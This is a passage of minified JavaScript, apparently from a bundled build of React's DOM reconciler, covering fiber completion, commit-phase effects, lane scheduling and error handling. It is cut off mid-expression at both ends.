st(e),null;if(r=(e.flags&128)!==0,a=o.rendering,a===null)if(r)ii(o,!1);else{if(He!==0||t!==null&&t.flags&128)for(t=e.child;t!==null;){if(a=Ca(t),a!==null){for(e.flags|=128,ii(o,!1),r=a.updateQueue,r!==null&&(e.updateQueue=r,e.flags|=4),e.subtreeFlags=0,r=n,n=e.child;n!==null;)o=n,t=r,o.flags&=14680066,a=o.alternate,a===null?(o.childLanes=0,o.lanes=t,o.child=null,o.subtreeFlags=0,o.memoizedProps=null,o.memoizedState=null,o.updateQueue=null,o.dependencies=null,o.stateNode=null):(o.childLanes=a.childLanes,o.lanes=a.lanes,o.child=a.child,o.subtreeFlags=0,o.deletions=null,o.memoizedProps=a.memoizedProps,o.memoizedState=a.memoizedState,o.updateQueue=a.updateQueue,o.type=a.type,t=a.dependencies,o.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext}),n=n.sibling;return ye(ke,ke.current&1|2),e.child}t=t.sibling}o.tail!==null&&ze()>Ns&&(e.flags|=128,r=!0,ii(o,!1),e.lanes=4194304)}else{if(!r)if(t=Ca(a),t!==null){if(e.flags|=128,r=!0,n=t.updateQueue,n!==null&&(e.updateQueue=n,e.flags|=4),ii(o,!0),o.tail===null&&o.tailMode==="hidden"&&!a.alternate&&!Ce)return st(e),null}else 2*ze()-o.renderingStartTime>Ns&&n!==1073741824&&(e.flags|=128,r=!0,ii(o,!1),e.lanes=4194304);o.isBackwards?(a.sibling=e.child,e.child=a):(n=o.last,n!==null?n.sibling=a:e.child=a,o.last=a)}return o.tail!==null?(e=o.tail,o.rendering=e,o.tail=e.sibling,o.renderingStartTime=ze(),e.sibling=null,n=ke.current,ye(ke,r?n&1|2:n&1),e):(st(e),null);case 22:case 23:return Su(),r=e.memoizedState!==null,t!==null&&t.memoizedState!==null!==r&&(e.flags|=8192),r&&e.mode&1?Et&1073741824&&(st(e),e.subtreeFlags&6&&(e.flags|=8192)):st(e),null;case 24:return null;case 25:return null}throw Error(O(156,e.tag))}function ob(t,e){switch(ru(e),e.tag){case 1:return Ct(e.type)&&xa(),t=e.flags,t&65536?(e.flags=t&-65537|128,e):null;case 3:return js(),_e(St),_e(ot),pu(),t=e.flags,t&65536&&!(t&128)?(e.flags=t&-65537|128,e):null;case 5:return uu(e),null;case 13:if(_e(ke),t=e.memoizedState,t!==null&&t.dehydrated!==null){if(e.alternate===null)throw Error(O(340));Ss()}return t=e.flags,t&65536?(e.flags=t&-65537|128,e):null;case 19:return _e(ke),null;case 4:return js(),null;case 10:return au(e.type._context),null;case 22:case 23:return Su(),null;case 24:return null;default:return null}}var $o=!1,it=!1,ab=typeof WeakSet=="function"?WeakSet:Set,Y=null;function cs(t,e){var n=t.ref;if(n!==null)if(typeof n=="function")try{n(null)}catch(r){Re(t,e,r)}else n.current=null}function id(t,e,n){try{n()}catch(r){Re(t,e,r)}}var _f=!1;function lb(t,e){if(Bc=fa,t=Pm(),tu(t)){if("selectionStart"in t)var n={start:t.selectionStart,end:t.selectionEnd};else e:{n=(n=t.ownerDocument)&&n.defaultView||window;var r=n.getSelection&&n.getSelection();if(r&&r.rangeCount!==0){n=r.anchorNode;var s=r.anchorOffset,o=r.focusNode;r=r.focusOffset;try{n.nodeType,o.nodeType}catch{n=null;break e}var a=0,l=-1,c=-1,d=0,p=0,f=t,u=null;t:for(;;){for(var b;f!==n||s!==0&&f.nodeType!==3||(l=a+s),f!==o||r!==0&&f.nodeType!==3||(c=a+r),f.nodeType===3&&(a+=f.nodeValue.length),(b=f.firstChild)!==null;)u=f,f=b;for(;;){if(f===t)break t;if(u===n&&++d===s&&(l=a),u===o&&++p===r&&(c=a),(b=f.nextSibling)!==null)break;f=u,u=f.parentNode}f=b}n=l===-1||c===-1?null:{start:l,end:c}}else n=null}n=n||{start:0,end:0}}else n=null;for(Uc={focusedElem:t,selectionRange:n},fa=!1,Y=e;Y!==null;)if(e=Y,t=e.child,(e.subtreeFlags&1028)!==0&&t!==null)t.return=e,Y=t;else for(;Y!==null;){e=Y;try{var x=e.alternate;if(e.flags&1024)switch(e.tag){case 0:case 11:case 15:break;case 1:if(x!==null){var v=x.memoizedProps,_=x.memoizedState,m=e.stateNode,h=m.getSnapshotBeforeUpdate(e.elementType===e.type?v:qt(e.type,v),_);m.__reactInternalSnapshotBeforeUpdate=h}break;case 3:var y=e.stateNode.containerInfo;y.nodeType===1?y.textContent="":y.nodeType===9&&y.documentElement&&y.removeChild(y.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(O(163))}}catch(w){Re(e,e.return,w)}if(t=e.sibling,t!==null){t.return=e.return,Y=t;break}Y=e.return}return x=_f,_f=!1,x}function wi(t,e,n){var r=e.updateQueue;if(r=r!==null?r.lastEffect:null,r!==null){var s=r=r.next;do{if((s.tag&t)===t){var o=s.destroy;s.destroy=void 0,o!==void 0&&id(e,n,o)}s=s.next}while(s!==r)}}function ol(t,e){if(e=e.updateQueue,e=e!==null?e.lastEffect:null,e!==null){var n=e=e.next;do{if((n.tag&t)===t){var r=n.create;n.destroy=r()}n=n.next}while(n!==e)}}function od(t){var e=t.ref;if(e!==null){var n=t.stateNode;switch(t.tag){case 5:t=n;break;default:t=n}typeof e=="function"?e(t):e.current=t}}function Ig(t){var e=t.alternate;e!==null&&(t.alternate=null,Ig(e)),t.child=null,t.deletions=null,t.sibling=null,t.tag===5&&(e=t.stateNode,e!==null&&(delete e[pn],delete e[Wi],delete e[Gc],delete e[Hy],delete e[Vy])),t.stateNode=null,t.return=null,t.dependencies=null,t.memoizedProps=null,t.memoizedState=null,t.pendingProps=null,t.stateNode=null,t.updateQueue=null}function Rg(t){return t.tag===5||t.tag===3||t.tag===4}function wf(t){e:for(;;){for(;t.sibling===null;){if(t.return===null||Rg(t.return))return null;t=t.return}for(t.sibling.return=t.return,t=t.sibling;t.tag!==5&&t.tag!==6&&t.tag!==18;){if(t.flags&2||t.child===null||t.tag===4)continue e;t.child.return=t,t=t.child}if(!(t.flags&2))return t.stateNode}}function ad(t,e,n){var r=t.tag;if(r===5||r===6)t=t.stateNode,e?n.nodeType===8?n.parentNode.insertBefore(t,e):n.insertBefore(t,e):(n.nodeType===8?(e=n.parentNode,e.insertBefore(t,n)):(e=n,e.appendChild(t)),n=n._reactRootContainer,n!=null||e.onclick!==null||(e.onclick=ga));else if(r!==4&&(t=t.child,t!==null))for(ad(t,e,n),t=t.sibling;t!==null;)ad(t,e,n),t=t.sibling}function ld(t,e,n){var r=t.tag;if(r===5||r===6)t=t.stateNode,e?n.insertBefore(t,e):n.appendChild(t);else if(r!==4&&(t=t.child,t!==null))for(ld(t,e,n),t=t.sibling;t!==null;)ld(t,e,n),t=t.sibling}var Je=null,Xt=!1;function $n(t,e,n){for(n=n.child;n!==null;)Tg(t,e,n),n=n.sibling}function Tg(t,e,n){if(fn&&typeof fn.onCommitFiberUnmount=="function")try{fn.onCommitFiberUnmount(Ja,n)}catch{}switch(n.tag){case 5:it||cs(n,e);case 6:var r=Je,s=Xt;Je=null,$n(t,e,n),Je=r,Xt=s,Je!==null&&(Xt?(t=Je,n=n.stateNode,t.nodeType===8?t.parentNode.removeChild(n):t.removeChild(n)):Je.removeChild(n.stateNode));break;case 18:Je!==null&&(Xt?(t=Je,n=n.stateNode,t.nodeType===8?Ql(t.parentNode,n):t.nodeType===1&&Ql(t,n),Li(t)):Ql(Je,n.stateNode));break;case 4:r=Je,s=Xt,Je=n.stateNode.containerInfo,Xt=!0,$n(t,e,n),Je=r,Xt=s;break;case 0:case 11:case 14:case 15:if(!it&&(r=n.updateQueue,r!==null&&(r=r.lastEffect,r!==null))){s=r=r.next;do{var o=s,a=o.destroy;o=o.tag,a!==void 0&&(o&2||o&4)&&id(n,e,a),s=s.next}while(s!==r)}$n(t,e,n);break;case 1:if(!it&&(cs(n,e),r=n.stateNode,typeof r.componentWillUnmount=="function"))try{r.props=n.memoizedProps,r.state=n.memoizedState,r.componentWillUnmount()}catch(l){Re(n,e,l)}$n(t,e,n);break;case 21:$n(t,e,n);break;case 22:n.mode&1?(it=(r=it)||n.memoizedState!==null,$n(t,e,n),it=r):$n(t,e,n);break;default:$n(t,e,n)}}function Sf(t){var e=t.updateQueue;if(e!==null){t.updateQueue=null;var n=t.stateNode;n===null&&(n=t.stateNode=new ab),e.forEach(function(r){var s=xb.bind(null,t,r);n.has(r)||(n.add(r),r.then(s,s))})}}function Qt(t,e){var n=e.deletions;if(n!==null)for(var r=0;r<n.length;r++){var s=n[r];try{var o=t,a=e,l=a;e:for(;l!==null;){switch(l.tag){case 5:Je=l.stateNode,Xt=!1;break e;case 3:Je=l.stateNode.containerInfo,Xt=!0;break e;case 4:Je=l.stateNode.containerInfo,Xt=!0;break e}l=l.return}if(Je===null)throw Error(O(160));Tg(o,a,s),Je=null,Xt=!1;var c=s.alternate;c!==null&&(c.return=null),s.return=null}catch(d){Re(s,e,d)}}if(e.subtreeFlags&12854)for(e=e.child;e!==null;)Ag(e,t),e=e.sibling}function Ag(t,e){var n=t.alternate,r=t.flags;switch(t.tag){case 0:case 11:case 14:case 15:if(Qt(e,t),dn(t),r&4){try{wi(3,t,t.return),ol(3,t)}catch(v){Re(t,t.return,v)}try{wi(5,t,t.return)}catch(v){Re(t,t.return,v)}}break;case 1:Qt(e,t),dn(t),r&512&&n!==null&&cs(n,n.return);break;case 5:if(Qt(e,t),dn(t),r&512&&n!==null&&cs(n,n.return),t.flags&32){var s=t.stateNode;try{Ti(s,"")}catch(v){Re(t,t.return,v)}}if(r&4&&(s=t.stateNode,s!=null)){var o=t.memoizedProps,a=n!==null?n.memoizedProps:o,l=t.type,c=t.updateQueue;if(t.updateQueue=null,c!==null)try{l==="input"&&o.type==="radio"&&o.name!=null&&em(s,o),Ac(l,a);var d=Ac(l,o);for(a=0;a<c.length;a+=2){var p=c[a],f=c[a+1];p==="style"?im(s,f):p==="dangerouslySetInnerHTML"?rm(s,f):p==="children"?Ti(s,f):Bd(s,p,f,d)}switch(l){case"input":Nc(s,o);break;case"textarea":tm(s,o);break;case"select":var u=s._wrapperState.wasMultiple;s._wrapperState.wasMultiple=!!o.multiple;var b=o.value;b!=null?ps(s,!!o.multiple,b,!1):u!==!!o.multiple&&(o.defaultValue!=null?ps(s,!!o.multiple,o.defaultValue,!0):ps(s,!!o.multiple,o.multiple?[]:"",!1))}s[Wi]=o}catch(v){Re(t,t.return,v)}}break;case 6:if(Qt(e,t),dn(t),r&4){if(t.stateNode===null)throw Error(O(162));s=t.stateNode,o=t.memoizedProps;try{s.nodeValue=o}catch(v){Re(t,t.return,v)}}break;case 3:if(Qt(e,t),dn(t),r&4&&n!==null&&n.memoizedState.isDehydrated)try{Li(e.containerInfo)}catch(v){Re(t,t.return,v)}break;case 4:Qt(e,t),dn(t);break;case 13:Qt(e,t),dn(t),s=t.child,s.flags&8192&&(o=s.memoizedState!==null,s.stateNode.isHidden=o,!o||s.alternate!==null&&s.alternate.memoizedState!==null||(_u=ze())),r&4&&Sf(t);break;case 22:if(p=n!==null&&n.memoizedState!==null,t.mode&1?(it=(d=it)||p,Qt(e,t),it=d):Qt(e,t),dn(t),r&8192){if(d=t.memoizedState!==null,(t.stateNode.isHidden=d)&&!p&&t.mode&1)for(Y=t,p=t.child;p!==null;){for(f=Y=p;Y!==null;){switch(u=Y,b=u.child,u.tag){case 0:case 11:case 14:case 15:wi(4,u,u.return);break;case 1:cs(u,u.return);var x=u.stateNode;if(typeof x.componentWillUnmount=="function"){r=u,n=u.return;try{e=r,x.props=e.memoizedProps,x.state=e.memoizedState,x.componentWillUnmount()}catch(v){Re(r,n,v)}}break;case 5:cs(u,u.return);break;case 22:if(u.memoizedState!==null){jf(f);continue}}b!==null?(b.return=u,Y=b):jf(f)}p=p.sibling}e:for(p=null,f=t;;){if(f.tag===5){if(p===null){p=f;try{s=f.stateNode,d?(o=s.style,typeof o.setProperty=="function"?o.setProperty("display","none","important"):o.display="none"):(l=f.stateNode,c=f.memoizedProps.style,a=c!=null&&c.hasOwnProperty("display")?c.display:null,l.style.display=sm("display",a))}catch(v){Re(t,t.return,v)}}}else if(f.tag===6){if(p===null)try{f.stateNode.nodeValue=d?"":f.memoizedProps}catch(v){Re(t,t.return,v)}}else if((f.tag!==22&&f.tag!==23||f.memoizedState===null||f===t)&&f.child!==null){f.child.return=f,f=f.child;continue}if(f===t)break e;for(;f.sibling===null;){if(f.return===null||f.return===t)break e;p===f&&(p=null),f=f.return}p===f&&(p=null),f.sibling.return=f.return,f=f.sibling}}break;case 19:Qt(e,t),dn(t),r&4&&Sf(t);break;case 21:break;default:Qt(e,t),dn(t)}}function dn(t){var e=t.flags;if(e&2){try{e:{for(var n=t.return;n!==null;){if(Rg(n)){var r=n;break e}n=n.return}throw Error(O(160))}switch(r.tag){case 5:var s=r.stateNode;r.flags&32&&(Ti(s,""),r.flags&=-33);var o=wf(t);ld(t,o,s);break;case 3:case 4:var a=r.stateNode.containerInfo,l=wf(t);ad(t,l,a);break;default:throw Error(O(161))}}catch(c){Re(t,t.return,c)}t.flags&=-3}e&4096&&(t.flags&=-4097)}function cb(t,e,n){Y=t,Pg(t)}function Pg(t,e,n){for(var r=(t.mode&1)!==0;Y!==null;){var s=Y,o=s.child;if(s.tag===22&&r){var a=s.memoizedState!==null||$o;if(!a){var l=s.alternate,c=l!==null&&l.memoizedState!==null||it;l=$o;var d=it;if($o=a,(it=c)&&!d)for(Y=s;Y!==null;)a=Y,c=a.child,a.tag===22&&a.memoizedState!==null?kf(s):c!==null?(c.return=a,Y=c):kf(s);for(;o!==null;)Y=o,Pg(o),o=o.sibling;Y=s,$o=l,it=d}Cf(t)}else s.subtreeFlags&8772&&o!==null?(o.return=s,Y=o):Cf(t)}}function Cf(t){for(;Y!==null;){var e=Y;if(e.flags&8772){var n=e.alternate;try{if(e.flags&8772)switch(e.tag){case 0:case 11:case 15:it||ol(5,e);break;case 1:var r=e.stateNode;if(e.flags&4&&!it)if(n===null)r.componentDidMount();else{var s=e.elementType===e.type?n.memoizedProps:qt(e.type,n.memoizedProps);r.componentDidUpdate(s,n.memoizedState,r.__reactInternalSnapshotBeforeUpdate)}var o=e.updateQueue;o!==null&&lf(e,o,r);break;case 3:var a=e.updateQueue;if(a!==null){if(n=null,e.child!==null)switch(e.child.tag){case 5:n=e.child.stateNode;break;case 1:n=e.child.stateNode}lf(e,a,n)}break;case 5:var l=e.stateNode;if(n===null&&e.flags&4){n=l;var c=e.memoizedProps;switch(e.type){case"button":case"input":case"select":case"textarea":c.autoFocus&&n.focus();break;case"img":c.src&&(n.src=c.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(e.memoizedState===null){var d=e.alternate;if(d!==null){var p=d.memoizedState;if(p!==null){var f=p.dehydrated;f!==null&&Li(f)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(O(163))}it||e.flags&512&&od(e)}catch(u){Re(e,e.return,u)}}if(e===t){Y=null;break}if(n=e.sibling,n!==null){n.return=e.return,Y=n;break}Y=e.return}}function jf(t){for(;Y!==null;){var e=Y;if(e===t){Y=null;break}var n=e.sibling;if(n!==null){n.return=e.return,Y=n;break}Y=e.return}}function kf(t){for(;Y!==null;){var e=Y;try{switch(e.tag){case 0:case 11:case 15:var n=e.return;try{ol(4,e)}catch(c){Re(e,n,c)}break;case 1:var r=e.stateNode;if(typeof r.componentDidMount=="function"){var s=e.return;try{r.componentDidMount()}catch(c){Re(e,s,c)}}var o=e.return;try{od(e)}catch(c){Re(e,o,c)}break;case 5:var a=e.return;try{od(e)}catch(c){Re(e,a,c)}}}catch(c){Re(e,e.return,c)}if(e===t){Y=null;break}var l=e.sibling;if(l!==null){l.return=e.return,Y=l;break}Y=e.return}}var db=Math.ceil,Na=Mn.ReactCurrentDispatcher,yu=Mn.ReactCurrentOwner,Ut=Mn.ReactCurrentBatchConfig,de=0,Qe=null,Oe=null,et=0,Et=0,ds=fr(0),He=0,Gi=null,Dr=0,al=0,bu=0,Si=null,yt=null,_u=0,Ns=1/0,Sn=null,Ea=!1,cd=null,er=null,Bo=!1,Yn=null,Ia=0,Ci=0,dd=null,na=-1,ra=0;function pt(){return de&6?ze():na!==-1?na:na=ze()}function tr(t){return t.mode&1?de&2&&et!==0?et&-et:Yy.transition!==null?(ra===0&&(ra=xm()),ra):(t=pe,t!==0||(t=window.event,t=t===void 0?16:Cm(t.type)),t):1}function nn(t,e,n,r){if(50<Ci)throw Ci=0,dd=null,Error(O(185));ao(t,n,r),(!(de&2)||t!==Qe)&&(t===Qe&&(!(de&2)&&(al|=n),He===4&&Vn(t,et)),jt(t,r),n===1&&de===0&&!(e.mode&1)&&(Ns=ze()+500,rl&&hr()))}function jt(t,e){var n=t.callbackNode;Y0(t,e);var r=pa(t,t===Qe?et:0);if(r===0)n!==null&&Dp(n),t.callbackNode=null,t.callbackPriority=0;else if(e=r&-r,t.callbackPriority!==e){if(n!=null&&Dp(n),e===1)t.tag===0?Gy(Nf.bind(null,t)):Um(Nf.bind(null,t)),By(function(){!(de&6)&&hr()}),n=null;else{switch(vm(r)){case 1:n=Yd;break;case 4:n=mm;break;case 16:n=ua;break;case 536870912:n=gm;break;default:n=ua}n=$g(n,Dg.bind(null,t))}t.callbackPriority=e,t.callbackNode=n}}function Dg(t,e){if(na=-1,ra=0,de&6)throw Error(O(327));var n=t.callbackNode;if(xs()&&t.callbackNode!==n)return null;var r=pa(t,t===Qe?et:0);if(r===0)return null;if(r&30||r&t.expiredLanes||e)e=Ra(t,r);else{e=r;var s=de;de|=2;var o=zg();(Qe!==t||et!==e)&&(Sn=null,Ns=ze()+500,Ir(t,e));do try{fb();break}catch(l){Lg(t,l)}while(!0);ou(),Na.current=o,de=s,Oe!==null?e=0:(Qe=null,et=0,e=He)}if(e!==0){if(e===2&&(s=Mc(t),s!==0&&(r=s,e=ud(t,s))),e===1)throw n=Gi,Ir(t,0),Vn(t,r),jt(t,ze()),n;if(e===6)Vn(t,r);else{if(s=t.current.alternate,!(r&30)&&!ub(s)&&(e=Ra(t,r),e===2&&(o=Mc(t),o!==0&&(r=o,e=ud(t,o))),e===1))throw n=Gi,Ir(t,0),Vn(t,r),jt(t,ze()),n;switch(t.finishedWork=s,t.finishedLanes=r,e){case 0:case 1:throw Error(O(345));case 2:wr(t,yt,Sn);break;case 3:if(Vn(t,r),(r&130023424)===r&&(e=_u+500-ze(),10<e)){if(pa(t,0)!==0)break;if(s=t.suspendedLanes,(s&r)!==r){pt(),t.pingedLanes|=t.suspendedLanes&s;break}t.timeoutHandle=Vc(wr.bind(null,t,yt,Sn),e);break}wr(t,yt,Sn);break;case 4:if(Vn(t,r),(r&4194240)===r)break;for(e=t.eventTimes,s=-1;0<r;){var a=31-tn(r);o=1<<a,a=e[a],a>s&&(s=a),r&=~o}if(r=s,r=ze()-r,r=(120>r?120:480>r?480:1080>r?1080:1920>r?1920:3e3>r?3e3:4320>r?4320:1960*db(r/1960))-r,10<r){t.timeoutHandle=Vc(wr.bind(null,t,yt,Sn),r);break}wr(t,yt,Sn);break;case 5:wr(t,yt,Sn);break;default:throw Error(O(329))}}}return jt(t,ze()),t.callbackNode===n?Dg.bind(null,t):null}function ud(t,e){var n=Si;return t.current.memoizedState.isDehydrated&&(Ir(t,e).flags|=256),t=Ra(t,e),t!==2&&(e=yt,yt=n,e!==null&&pd(e)),t}function pd(t){yt===null?yt=t:yt.push.apply(yt,t)}function ub(t){for(var e=t;;){if(e.flags&16384){var n=e.updateQueue;if(n!==null&&(n=n.stores,n!==null))for(var r=0;r<n.length;r++){var s=n[r],o=s.getSnapshot;s=s.value;try{if(!on(o(),s))return!1}catch{return!1}}}if(n=e.child,e.subtreeFlags&16384&&n!==null)n.return=e,e=n;else{if(e===t)break;for(;e.sibling===null;){if(e.return===null||e.return===t)return!0;e=e.return}e.sibling.return=e.return,e=e.sibling}}return!0}function Vn(t,e){for(e&=~bu,e&=~al,t.suspendedLanes|=e,t.pingedLanes&=~e,t=t.expirationTimes;0<e;){var n=31-tn(e),r=1<<n;t[n]=-1,e&=~r}}function Nf(t){if(de&6)throw Error(O(327));xs();var e=pa(t,0);if(!(e&1))return jt(t,ze()),null;var n=Ra(t,e);if(t.tag!==0&&n===2){var r=Mc(t);r!==0&&(e=r,n=ud(t,r))}if(n===1)throw n=Gi,Ir(t,0),Vn(t,e),jt(t,ze()),n;if(n===6)throw Error(O(345));return t.finishedWork=t.current.alternate,t.finishedLanes=e,wr(t,yt,Sn),jt(t,ze()),null}function wu(t,e){var n=de;de|=1;try{return t(e)}finally{de=n,de===0&&(Ns=ze()+500,rl&&hr())}}function Lr(t){Yn!==null&&Yn.tag===0&&!(de&6)&&xs();var e=de;de|=1;var n=Ut.transition,r=pe;try{if(Ut.transition=null,pe=1,t)return t()}finally{pe=r,Ut.transition=n,de=e,!(de&6)&&hr()}}function Su(){Et=ds.current,_e(ds)}function Ir(t,e){t.finishedWork=null,t.finishedLanes=0;var n=t.timeoutHandle;if(n!==-1&&(t.timeoutHandle=-1,$y(n)),Oe!==null)for(n=Oe.return;n!==null;){var r=n;switch(ru(r),r.tag){case 1:r=r.type.childContextTypes,r!=null&&xa();break;case 3:js(),_e(St),_e(ot),pu();break;case 5:uu(r);break;case 4:js();break;case 13:_e(ke);break;case 19:_e(ke);break;case 10:au(r.type._context);break;case 22:case 23:Su()}n=n.return}if(Qe=t,Oe=t=nr(t.current,null),et=Et=e,He=0,Gi=null,bu=al=Dr=0,yt=Si=null,kr!==null){for(e=0;e<kr.length;e++)if(n=kr[e],r=n.interleaved,r!==null){n.interleaved=null;var s=r.next,o=n.pending;if(o!==null){var a=o.next;o.next=s,r.next=a}n.pending=r}kr=null}return t}function Lg(t,e){do{var n=Oe;try{if(ou(),Zo.current=ka,ja){for(var r=Ne.memoizedState;r!==null;){var s=r.queue;s!==null&&(s.pending=null),r=r.next}ja=!1}if(Pr=0,Ye=$e=Ne=null,_i=!1,Ui=0,yu.current=null,n===null||n.return===null){He=1,Gi=e,Oe=null;break}e:{var o=t,a=n.return,l=n,c=e;if(e=et,l.flags|=32768,c!==null&&typeof c=="object"&&typeof c.then=="function"){var d=c,p=l,f=p.tag;if(!(p.mode&1)&&(f===0||f===11||f===15)){var u=p.alternate;u?(p.updateQueue=u.updateQueue,p.memoizedState=u.memoizedState,p.lanes=u.lanes):(p.updateQueue=null,p.memoizedState=null)}var b=hf(a);if(b!==null){b.flags&=-257,mf(b,a,l,o,e),b.mode&1&&ff(o,d,e),e=b,c=d;var x=e.updateQueue;if(x===null){var v=new Set;v.add(c),e.updateQueue=v}else x.add(c);break e}else{if(!(e&1)){ff(o,d,e),Cu();break e}c=Error(O(426))}}else if(Ce&&l.mode&1){var _=hf(a);if(_!==null){!(_.flags&65536)&&(_.flags|=256),mf(_,a,l,o,e),su(ks(c,l));break e}}o=c=ks(c,l),He!==4&&(He=2),Si===null?Si=[o]:Si.push(o),o=a;do{switch(o.tag){case 3:o.flags|=65536,e&=-e,o.lanes|=e;var m=vg(o,c,e);af(o,m);break e;case 1:l=c;var h=o.type,y=o.stateNode;if(!(o.flags&128)&&(typeof h.getDerivedStateFromError=="function"||y!==null&&typeof y.componentDidCatch=="function"&&(er===null||!er.has(y)))){o.flags|=65536,e&=-e,o.lanes|=e;var w=yg(o,l,e);af(o,w);break e}}o=o.return}while(o!==null)}Og(n)}catch(N){e=N,Oe===n&&n!==null&&(Oe=n=n.return);continue}break}while(!0)}function zg(){var t=Na.current;return Na.current=ka,t===null?ka:t}function Cu(){(He===0||He===3||He===2)&&(He=4),Qe===null||!(Dr&268435455)&&!(al&268435455)||Vn(Qe,et)}function Ra(t,e){var n=de;de|=2;var r=zg();(Qe!==t||et!==e)&&(Sn=null,Ir(t,e));do try{pb();break}catch(s){Lg(t,s)}while(!0);if(ou(),de=n,Na.current=r,Oe!==null)throw Error(O(261));return Qe=null,et=0,He}function pb(){for(;Oe!==null;)Mg(Oe)}function fb(){for(;Oe!==null&&!O0();)Mg(Oe)}function Mg(t){var e=Wg(t.alternate,t,Et);t.memoizedProps=t.pendingProps,e===null?Og(t):Oe=e,yu.current=null}function Og(t){var e=t;do{var n=e.alternate;if(t=e.return,e.flags&32768){if(n=ob(n,e),n!==null){n.flags&=32767,Oe=n;return}if(t!==null)t.flags|=32768,t.subtreeFlags=0,t.deletions=null;else{He=6,Oe=null;return}}else if(n=ib(n,e,Et),n!==null){Oe=n;return}if(e=e.sibling,e!==null){Oe=e;return}Oe=e=t}while(e!==null);He===0&&(He=5)}function wr(t,e,n){var r=pe,s=Ut.transition;try{Ut.transition=null,pe=1,hb(t,e,n,r)}finally{Ut.transition=s,pe=r}return null}function hb(t,e,n,r){do xs();while(Yn!==null);if(de&6)throw Error(O(327));n=t.finishedWork;var s=t.finishedLanes;if(n===null)return null;if(t.finishedWork=null,t.finishedLanes=0,n===t.current)throw Error(O(177));t.callbackNode=null,t.callbackPriority=0;var o=n.lanes|n.childLanes;if(K0(t,o),t===Qe&&(Oe=Qe=null,et=0),!(n.subtreeFlags&2064)&&!(n.flags&2064)||Bo||(Bo=!0,$g(ua,function(){return xs(),null})),o=(n.flags&15990)!==0,n.subtreeFlags&15990||o){o=Ut.transition,Ut.transition=null;var a=pe;pe=1;var l=de;de|=4,yu.current=null,lb(t,n),Ag(n,t),Dy(Uc),fa=!!Bc,Uc=Bc=null,t.current=n,cb(n),F0(),de=l,pe=a,Ut.transition=o}else t.current=n;if(Bo&&(Bo=!1,Yn=t,Ia=s),o=t.pendingLanes,o===0&&(er=null),B0(n.stateNode),jt(t,ze()),e!==null)for(r=t.onRecoverableError,n=0;n<e.length;n++)s=e[n],r(s.value,{componentStack:s.stack,digest:s.digest});if(Ea)throw Ea=!1,t=cd,cd=null,t;return Ia&1&&t.tag!==0&&xs(),o=t.pendingLanes,o&1?t===dd?Ci++:(Ci=0,dd=t):Ci=0,hr(),null}function xs(){if(Yn!==null){var t=vm(Ia),e=Ut.transition,n=pe;try{if(Ut.transition=null,pe=16>t?16:t,Yn===null)var r=!1;else{if(t=Yn,Yn=null,Ia=0,de&6)throw Error(O(331));var s=de;for(de|=4,Y=t.current;Y!==null;){var o=Y,a=o.child;if(Y.flags&16){var l=o.deletions;if(l!==null){for(var c=0;c<l.length;c++){var d=l[c];for(Y=d;Y!==null;){var p=Y;switch(p.tag){case 0:case 11:case 15:wi(8,p,o)}var f=p.child;if(f!==null)f.return=p,Y=f;else for(;Y!==null;){p=Y;var u=p.sibling,b=p.return;if(Ig(p),p===d){Y=null;break}if(u!==null){u.return=b,Y=u;break}Y=b}}}var x=o.alternate;if(x!==null){var v=x.child;if(v!==null){x.child=null;do{var _=v.sibling;v.sibling=null,v=_}while(v!==null)}}Y=o}}if(o.subtreeFlags&2064&&a!==null)a.return=o,Y=a;else e:for(;Y!==null;){if(o=Y,o.flags&2048)switch(o.tag){case 0:case 11:case 15:wi(9,o,o.return)}var m=o.sibling;if(m!==null){m.return=o.return,Y=m;break e}Y=o.return}}var h=t.current;for(Y=h;Y!==null;){a=Y;var y=a.child;if(a.subtreeFlags&2064&&y!==null)y.return=a,Y=y;else e:for(a=h;Y!==null;){if(l=Y,l.flags&2048)try{switch(l.tag){case 0:case 11:case 15:ol(9,l)}}catch(N){Re(l,l.return,N)}if(l===a){Y=null;break e}var w=l.sibling;if(w!==null){w.return=l.return,Y=w;break e}Y=l.return}}if(de=s,hr(),fn&&typeof fn.onPostCommitFiberRoot=="function")try{fn.onPostCommitFiberRoot(Ja,t)}catch{}r=!0}return r}finally{pe=n,Ut.transition=e}}return!1}function Ef(t,e,n){e=ks(n,e),e=vg(t,e,1),t=Zn(t,e,1),e=pt(),t!==null&&(ao(t,1,e),jt(t,e))}function Re(t,e,n){if(t.tag===3)Ef(t,t,n);else for(;e!==null;){if(e.tag===3){Ef(e,t,n);break}else if(e.tag===1){var r=e.stateNode;if(typeof e.type.getDerivedStateFromError=="function"||typeof r.componentDidCatch=="function"&&(er===null||!er.has(r))){t=ks(n,t),t=yg(e,t,1),e=Zn(e,t,1),t=pt(),e!==null&&(ao(e,1,t),jt(e,t));break}}e=e.return}}function mb(t,e,n){var r=t.pingCache;r!==null&&r.delete(e),e=pt(),t.pingedLanes|=t.suspendedLanes&n,Qe===t&&(et&n)===n&&(He===4||He===3&&(et&130023424)===et&&500>ze()-_u?Ir(t,0):bu|=n),jt(t,e)}function Fg(t,e){e===0&&(t.mode&1?(e=Ao,Ao<<=1,!(Ao&130023424)&&(Ao=4194304)):e=1);var n=pt();t=An(t,e),t!==null&&(ao(t,e,n),jt(t,n))}function gb(t){var e=t.memoizedState,n=0;e!==null&&(n=e.retryLane),Fg(t,n)}function xb(t,e){var n=0;switch(t.tag){case 13:var r=t.stateNode,s=t.memoizedState;s!==null&&(n=s.retryLane);break;case 19:r=t.stateNode;break;default:throw Error(O(314))}r!==null&&r.delete(e),Fg(t,n)}var Wg;Wg=function(t,e,n){if(t!==null)if(t.memoizedProps!==e.pendingProps||St.current)_t=!0;else{if(!(t.lanes&n)&&!(e.flags&128))return _t=!1,sb(t,e,n);_t=!!(t.flags&131072)}else _t=!1,Ce&&e.flags&1048576&&Hm(e,ba,e.index);switch(e.lanes=0,e.tag){case 2:var r=e.type;ta(t,e),t=e.pendingProps;var s=ws(e,ot.current);gs(e,n),s=hu(null,e,r,t,s,n);var o=mu();return e.flags|=1,typeof s=="object"&&s!==null&&typeof s.render=="function"&&s.$$typeof===void 0?(e.tag=1,e.memoizedState=null,e.updateQueue=null,Ct(r)?(o=!0,va(e)):o=!1,e.memoizedState=s.state!==null&&s.state!==void 